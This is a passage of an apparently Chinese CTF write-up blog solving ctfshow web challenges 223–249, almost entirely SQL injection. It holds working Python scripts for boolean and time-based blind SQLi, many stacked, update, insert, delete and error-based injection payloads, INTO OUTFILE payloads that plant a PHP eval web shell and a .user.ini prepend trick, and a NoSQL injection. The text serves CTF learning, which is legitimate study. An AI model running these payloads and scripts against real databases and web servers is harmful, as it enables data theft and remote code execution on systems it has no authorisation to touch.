        payload = '?u=id having (select mid(group_concat(table_name),length("%s"),length("y")) from information_schema.tables where table_schema=database())="%c"'% (creat_num(x),y)
        r = requests.get(url + payload)
        if r"\u67e5\u8be2\u6210\u529f" in r.text:
            tb_name += y
            break
    print("\r[+]table name is %s"% tb_name, end = '')
    if y == "!":
        break
print("\n\nDone!The table names in this database are：",tb_name)

guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
#column_name
for x in range(1,100):
    for y in r'abcdefghijklmnopqrstuvwxyz_,!':
        payload = '?u=id having (select mid(group_concat(column_name),length("%s"),length("y")) from information_schema.columns where table_name="%s")="%c"'% (creat_num(x),guess_tbName,y)
        r = requests.get(url + payload)
        #print(payload)
        if r"\u67e5\u8be2\u6210\u529f" in r.text:
            column_name += y
            break
    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
    if y == "!":
        break

guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")

for x in range(1,100):
    payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s) REGEXP "[a-z]|{|}|-"'% (guess_flag,creat_num(x),guess_tbName)
    r = requests.get(url + payload)
    #print(payload)
    if r"\u67e5\u8be2\u6210\u529f" in r.text:
        for y in r'flag{bcde-hijkmnopqrstuvwxyz}':
            payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)="%c"'% (guess_flag,creat_num(x),guess_tbName,y)
            r = requests.get(url + payload)
            #print(payload)
            if r"\u67e5\u8be2\u6210\u529f" in r.text:
                flag += y
                break
    else:
        for y in r'1234567890':
            payload = '?u=id having (select mid(group_concat(%s),length("%s"),length("y")) from %s)=length("%s")'% (guess_flag,creat_num(x),guess_tbName,creat_num(int(y)))
            r = requests.get(url + payload)
            #print(payload)
            if r"\u67e5\u8be2\u6210\u529f" in r.text:
                flag += y
                break
    print("\r[+]The flag is %s"% flag,end = '')
    if "}" in flag:
        break
```

## web224
>[Y1ng](https://www.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5)大师傅博客

用的群里师傅的，payload，可以去下载一波~~，不多解释啦

## web226
>堆叠\
sql: `$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";`\
waf: `preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i',$username)`

预编译淦，引用自[简简的我](https://www.jianshu.com/p/36f0772f5ce8)
>`PREPARE name from '[my sql sequece]';` --> 预定义SQL语句\
`EXECUTE name;` --> 执行预定义SQL语句\
`(DEALLOCATE || DROP) PREPARE name;` --> 删除预定义SQL语句

>预编译也能用变量\
`SET @tn = 'hahaha';`  //存储表名\
`SET @sql = concat('select * from ', @tn);`  //存储SQL语句\
`PREPARE name from @sql;`   //预定义SQL语句\
`EXECUTE name;`  //执行预定义SQL语句\
`(DEALLOCATE || DROP) PREPARE sqla;`  //删除预定义SQL语句

但是ban了set，变量凉凉\
先查表：`user1';show tables;#`\
payload1: ``user1';PREPARE yq1ng from concat(char(115,101,108,101,99,116), ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#``\
注：`char(115,101,108,101,99,116)<----->'select'`\
payload2: ``user1';PREPARE yq1ng from concat('s','elect', ' * from `ctfshow_flagasa` ');EXECUTE yq1ng;#``

## web226
sql: `$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";`\
waf: `preg_match('/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i',$username)`\
还好，上一条hex编码就好了，记得前面加个0x；\
查表：`?username=user1';PREPARE yq1ng from 0x73686F77207461626C6573;EXECUTE yq1ng;#` --> `hex("show tables")`\
flag：`?username=user1';PREPARE yq1ng from 0x73656C656374202A2066726F6D2063746673685F6F775F666C61676173;EXECUTE yq1ng;#`

## web227
>MySQL的存储过程\
建议先看两个参考:\
[MySQL 存储过程介绍](https://www.runoob.com/w3cnote/mysql-stored-procedure.html),
[MySQL—查看存储过程和函数](https://blog.csdn.net/qq_41573234/article/details/80411079)

照群主的话说就是flag即在表内又不在表内\
先看表，和上一题一样，接着。。。把表翻了一遍没flag，问了群主是存储过程，Google无果，给了payload：`1';call getFlag();`\
然后查`call`，找到上述两篇链接，本地也复现了一下，也是类似预编译，用户自定义函数再去调用，直接`SELECT   *   FROM   information_schema.Routines`可以发现所有自定函数及内容，payload：`?username=1';PREPARE yq1ng from 0x53454C4543542020202A20202046524F4D202020696E666F726D6174696F6E5F736368656D612E526F7574696E6573;EXECUTE yq1ng;#`\
本题也算是初步认识了存储过程，以后再遇见也有点谱，复现记录：
```mysql
mysql> delimiter $$ //临时定义结束符为$$
mysql> create procedure test() //创建函数
    -> begin //开始
    ->     select "flag{test}"; //语句
    -> end$$ //结束+结束符
Query OK, 0 rows affected (0.36 sec)
mysql> delimiter ; //将结束符改为;
mysql> call test(); //调用定义函数
+------------+
| flag{test} |
+------------+
| flag{test} |
+------------+
1 row in set (0.07 sec)

Query OK, 0 rows affected (0.07 sec)
```

## web228 | 229 |230
```
sql
//分页查询
$sql = "select id,username,pass from ctfshow_user where username = '{$username}';";
$bansql = "select char from banlist;";
```

```
waf
//师傅说内容太多，就写入数据库保存
if(count($banlist)>0){
foreach ($banlist as $char) {
    if(preg_match("/".$char."/i", $username)){
    die(json_encode($ret));
    }
}
}
```

和226一样的套路，通杀了。。。主要是sql和waf不太一样，所有没放一起

过滤挺多，懒得解码了：`{"id":"2","username":"user1","pass":"111"},{"id":"1","char":"union"},{"id":"2","char":"file"},{"id":"3","char":"into"},{"id":"4","char":"handler"},{"id":"5","char":"db"},{"id":"6","char":"select"},{"id":"7","char":"update"},{"id":"8","char":"dump"},{"id":"9","char":"delete"},{"id":"10","char":"create"},{"id":"11","char":"drop"},{"id":"12","char":"show"},{"id":"13","char":"describe"},{"id":"14","char":"set"},{"id":"15","char":"alter"}`

## web231 | 232
第一次写update注入，才知道不能直接将查询结果进行赋值，[详见此](https://www.cnblogs.com/duanxz/p/5099030.html)，这种思路。。真骚

sql: `$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`

表名: `',username=(select yq1ng.a from (select group_concat(table_name)a from information_schema.tables where table_schema=database()) yq1ng) where username="user1";#` --> banlist,ctfshow_user,flaga

列名：`',username=(select yq1ng.a from (select group_concat(column_name)a from information_schema.columns where table_name="flaga") yq1ng) where username="user1";#` --> id,flagas,info

flag: `',username=(select yq1ng.a from (select group_concat(flagas)a from flaga) yq1ng) where username="user1";#`

## web233
掉进坑里了，思路还在前两题，感谢飞鱼和space man师傅的思路，时间盲注，写的乱乱的，有时间整理一个函数，简洁一点
```python
# encoding: utf-8
# @Author:  yq1ng
# @Date:    2020-11-20 23:00

import requests

url = "http://059e89aa-6633-4b85-a554-dea3e2b48d9a.chall.ctf.show/api/"
data = {"password":4, "username":""}
tb_name = ''
column_name = ''
flag = ''

for i in range(1,100):
    for j in r'ctfshow_abdegijklmnopqruvxyz-,1234567890!':
        payload = "user1'and(if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(2),1))and'1'='1"% (i,j)
        data["username"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            tb_name += j
            break
    print("\r[+]table name is %s"% tb_name, end = '')
    if j == "!":
        break

guess_tbName = input("\nPlease enter the name of the table you want to guess: ")
#column_name
for i in range(1,100):
    for j in r'abcdefghijklmnopqrstuvwxyz_,1234567890!':
        payload = "user1'and(if(substr((select group_concat(column_name) from information_schema.columns where table_name='%s'),%d,1)='%c',sleep(2),1))and'1'='1"% (guess_tbName,i,j)
        data["username"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            tb_name += j
            break
    print("\r[+]The column name in the %s table is %s"%(guess_tbName,column_name), end = '')
    if j == "!":
        break

guess_flag = input("\n\nOkay, we're getting a flag. Tell me the list:")
#flag
print("\nGetting the flag......")
for i in range(1,100):
    for j in r'flag{b7c4de-2hi1jk0mn5o3p6q8rstuvw9xyz}':
        payload = "user1'and(if(substr((select %s from %s),%d,1)='%c',sleep(2),1))and'1'='1"% (guess_flag,guess_tbName,i,j)
        data["username"] = payload
        #print(data)
        r = requests.post(url, data = data)
        time = r.elapsed.total_seconds()
        #print(time)#获取响应时间
        if time > 2:
            flag += j
            break
    print("\r[+]The flag is %s"% flag,end = '')
    if j == "}":
        break
```

## web234
sql：`$sql = "update ctfshow_user set pass = '{$password}' where username = '{$username}';";`\
说是没过滤，其实单引号没了。。。永远不要相信出题人的话，在[BJDCTF 2nd的简单注入](https://yq1ng.github.io/z_post/BJDCTF-2nd%20WEB/#bjdctf-2nd%E7%AE%80%E5%8D%95%E6%B3%A8%E5%85%A5)一题中提到过单引号逃逸，当输入的pass为`\`时，sql语句变为：`update ctfshow_user set pass = '\' where username = 'user1';`，此时pass为`where username = `实现单引号逃逸\
payload：查表：`password=\&username=,username=(select group_concat(table_name) from information_schema.columns where table_schema=database())#`，注意，这会把所有的user和pass全部改掉，实际注入加上where或者盲注\
查列：`password=\&username=,username=(select group_concat(column_name) from information_schema.columns where table_name=0x666c6167323361)#`\
flag：`password=\&username=,username=(select flagass23s3 from flag23a)#`

## web235
过滤` or ' `\
这题。。上面的information带or，参考[bypass information](https://blog.csdn.net/qq_45521281/article/details/106647880)
表名：`password=\&username=,username=(select group_concat(table_name) from mysql.innodb_table_stats where database_name=database())#` 只有这个成了，其他的没成功\
列名不得行，其他库中并未存储列名，还有办法：无列名注入，上面的博客也有写，payload：``password=\&username=,username=(select `2` from (select 1,2,3 union select * from flag23a1 limit 1,1)y)#``，其实[GYCTF2020 Ezsqli](https://yq1ng.github.io/z_post/GYCTF2020%E9%83%A8%E5%88%86WEB/#gyctf2020ezsqli)就已经写过了

## web236
增加过滤`flag`，棒棒哒\
表名和上题一样，测试了`password=flag&username=banlist,ctfshow_user,flaga`可以把密码改为flag，也就是输出过滤。。。我以为是输入过滤\
输出编码，前几关就是这么过的payload：``password=\&username=,username=(select hex(`2`) from (select 1,2,3 union select * from flaga limit 1,1)y)#``

## web237
sql: `$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";`，无过滤\
注意：insert盲注会产生大量数据\
api下插入不得行，抓包发现是在`URL/api/insert.php`下\
表名：`username=yq1ng',(select group_concat(table_name) from information_schema.tables where table_schema=database()))#&password=yq1ng`\
列名：`username=yq1ng',(select group_concat(column_name) from information_schema.columns where table_name='flag'))#&password=yq1ng`\
flag: `username=yq1ng',(select group_concat(flagass23s3) from flag))#&password=yq1ng`

## web238
过滤空格\
那就不用呗，前面的老套路，括号淦，表名：`username=yq1ng',(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())))#&password=yq1ng`\
列名：`username=yq1ng',(select(group_concat(column_name))from(information_schema.columns)where(table_name='flagb')))#&password=yq1ng`\
flag: `username=yq1ng',(select(group_concat(flag))from(flagb)))#&password=yq1ng`

## web239
增加过滤`or`\
这是又过了一遍？前面的无列名注入？什么你忘了？回去看看web235！\
表名：`username=yq1ng',(select(group_concat(table_name))from(mysql.innodb_table_stats)where(database_name=database())))#&password=yq1ng`\
列名：占坑，试了没弄出来\
flag: `username=yq1ng',(select(group_concat(flag))from(flagbb)))#&password=yq1ng`，猜的。。。

## web240
sql：`$sql = "insert into ctfshow_user(username,pass) value('{$username}','{$password}');";`\
waf: `空格 or sys mysql`\
Hint: 表名共9位，flag开头，后五位由a/b组成，如flagabaab，全小写\
就这过滤，，，全靠运气解法，后五位只有ab，一共32中情况，确定了，是个算法题目，跑完去`URL/page.php`最后一页看看，要是100次还没出说明你也太黑了哈哈哈，脚本参考[Y4师傅](https://y4tacker.blog.csdn.net/article/details/110144623)
```python
# encoding:     utf-8
# @Author:      yq1ng
# @Date:        2020-11-29 23:00
# @challenges： web240

import requests
import random

url = "http://d140c93f-746e-41d4-a13e-02c42e17237d.chall.ctf.show/api/insert.php"
data = {'username': "", 'password': ''}

def TableName():
    values = "ab"
    table = [random.choice(values) for i in range(5)]
    tableName = ''.join(table)
    return tableName

for x in range(1,100):
    data["username"] = f"yq1ng',(select(flag)from(flag{TableName()})))#"
    s = requests.post(url, data = data)
    print(data)
```

## web241
无过滤的delete注入，基于时间盲注，表的内容不要太多，因为返回时间是`sleep(x)*条数`（flag不对建议再跑一次，或者不急的话可以增加时间，因为服务器响应可能有时候比较慢）

payload：`URL/api/delete.php` 爆表：`-1 or if(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1)='%c',sleep(1),0)`，其他的就是正常注入，改一下if条件就好

注意，if最后条件为0，不然直接把表清空了hhh

## web242
sql：`$sql = "select * from ctfshow_user into outfile '/var/www/html/dump/{$filename}';";`

无过滤

介绍一下`into outfile`
>1. 介绍：
 SELECT INTO…OUTFILE语句把表数据导出到一个文本文件中，并用LOAD DATA …INFILE语句恢复数据。但是这种方法只能导出或导入数据的内容，不包括表的结构，如果表的结构文件损坏，则必须先恢复原来的表的结构。也可以将查询结果保存在变量中。
 2. 语法：
    ```php
    SELECT ... INTO OUTFILE 'file_name'
            [CHARACTER SET charset_name]
            [export_options]
    
    export_options:
        [{FIELDS | COLUMNS}
            [TERMINATED BY 'string']//分隔符
            [[OPTIONALLY] ENCLOSED BY 'char']
            [ESCAPED BY 'char']
        ]
        [LINES
            [STARTING BY 'string']
            [TERMINATED BY 'string']
        ]
    ```

    “OPTION”参数为可选参数选项，其可能的取值有：

    `FIELDS TERMINATED BY '字符串'`：设置字符串为字段之间的分隔符，可以为单个或多个字符。默认值是“\t”。

    `FIELDS ENCLOSED BY '字符'`：设置字符来括住字段的值，只能为单个字符。默认情况下不使用任何符号。

    `FIELDS OPTIONALLY ENCLOSED BY '字符'`：设置字符来括住CHAR、VARCHAR和TEXT等字符型字段。默认情况下不使用任何符号。

    `FIELDS ESCAPED BY '字符'`：设置转义字符，只能为单个字符。默认值为“\”。

    `LINES STARTING BY '字符串'`：设置每行数据开头的字符，可以为单个或多个字符。默认情况下不使用任何字符。

    `LINES TERMINATED BY '字符串'`：设置每行数据结尾的字符，可以为单个或多个字符。默认值是“\n”。

`FIELDS`和`LINES`两个子句都是自选的，但是如果两个子句都被指定了，FIELDS必须位于LINES的前面。

所以，利用分隔符进行写shell

payload：`URL/api/dump.php`\
`filename=yq1ng.php' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27'` --> `'<?php @eval($_POST['yq1ng']);?>'`

## web243
太菜了，一直没传对，问了问群主，这题上传`.user.ini`解析图片就行，上传URL：`URL/api/dump.php`，进制内容自行转换查看

`.user.ini`的payload：`filename=.user.ini' lines starting by ';' terminated by 0x0A6175746F5F70726570656E645F66696C653D7971316E672E6A70670A6175746F5F617070656E645F66696C653D7971316E672E6A70670A;--+`

`yq1ng.jpg`的payload：`filename=yq1ng.jpg' lines terminated by 0x273C3F70687020406576616C28245F504F53545B277971316E67275D293B3F3E27;--+`

最后在`URL/dump/index.php`下蚁剑链接即可

## web244
报错注入，无过滤\
sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`

payload：`URL/api/?id=1' and (updatexml(1,concat(0x7e,(select right(flag,30) from ctfshow_flag),0x7e),1));%23`\
注意：报错最大长度为32位，需要配合截取函数使用

原理：
>`updatexml (XML_document, XPath_string, new_value); ` --> 改变文档中符合条件的节点的值\
参数介绍：
>- 第一个参数：`XML_document`是String格式，为XML文档对象的名称，文中为Doc
>- 第二个参数：`XPath_string` (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
>- 第三个参数：`new_value`，String格式，替换查找到的符合条件的数据

>报错原理：\
第二个参数`XPath_string`，如果传入的的不是XPath格式就会报错\
为什么要使用concat 这个函数呢，因为它是个连接函数你不用的话(updatexml(1,(select user()),1)) 这样也可以但是需要字符中有特殊字符，才会报错，同时它会被中间的特殊字符截断，所以需要用到concat用特殊字符给他连接起来

## web245
sql: `$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`\
过滤`updatexml`，报错姿势很多的\
payload：`URL/api/?id=1' and (extractvalue(1,concat(0x7e,(select right(flag1,30) from ctfshow_flagsa),0x7e)))%23`

原理：
>`extractValue(xml_frag, xpath_expr)` --> 使用XPath表示法从XML字符串中提取值\
参数介绍：
>- 第一个参数可以传入目标xml文档
>- 第二个参数是用Xpath路径法表示的查找路径

原理同上

## web246
sql：`$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`

过滤：`updatexml` `extractvalue`

floor报错，原理在另外一篇博客，[点此进入](https://yq1ng.github.io/z_post/%E9%87%8D%E5%90%AF%EF%BC%8CSQLi-labs-GET/#less-6-get-%E5%8F%8C%E6%B3%A8%E5%85%A5-%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5)，注意，子查询返回只能为1行

爆表：`URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`

flag列：`api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select column_name from information_schema.columns where table_name="ctfshow_flags" limit 1,1),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`

因为ctfshow_flags表只有一行，就不limit了：`URL/api/?id=1' union select 1,count(*),concat(0x3a,0x3a,(select flag2 from ctfshow_flags),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;%23`

## web247
猜着就会过滤floor哈哈哈\
sql: `$sql = "select id,username,pass from ctfshow_user where id = '".$id."' limit 1;";`

过滤：`updatexml` `extractvalue` `floor`

。。。12种报错全试了，一会再来\
只得试出数据库版本`URL/api/?id=1' and exists(select * from (select * from(select name_const(version(),0))a join (select name_const(version(),0))b)c);%23`\
盲！盲注yyds，前面的脚本随便改个，可以说是无过滤(脚本没跑成，用了sqlmap，脚本未成的原因是列名字典我没加`?`。。。)，当然，sqlmap也行，记得加上请求头`--user-agent="Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36"`

## web248
udf注入，这个真是第一次听说，Google一番也是不会，只知道是利用MySQL提权的，用的翅膀大佬的脚本，只能说tttttqqqqql，翅膀师傅的脚本注释也写得很明白，永存了，膜

## web249
sql：emm忘了写，下次一定\
无waf\
[MongoDB 教程](https://www.runoob.com/mongodb/mongodb-tutorial.html)\
[NoSQL注入小笔记](http://rui0.cn/archives/609)
>常见的条件操作符：
```
$gt : >
$lt : <
$gte: >=
$lte: <=
$ne : !=、<>
$in : in
$nin: not in
$all: all 
$or:or
$not: 反匹配(1.3.3及以上版本)
模糊查询用正则式：db.customer.find({'name': {'$regex':'.*s.*'} })
/**
* : 范围查询 { "age" : { "$gte" : 2 , "$lte" : 21}}
* : $ne { "age" : { "$ne" : 23}}
* : $lt { "age" : { "$lt" : 23}}
*/
```

payload：`?id[]=flag`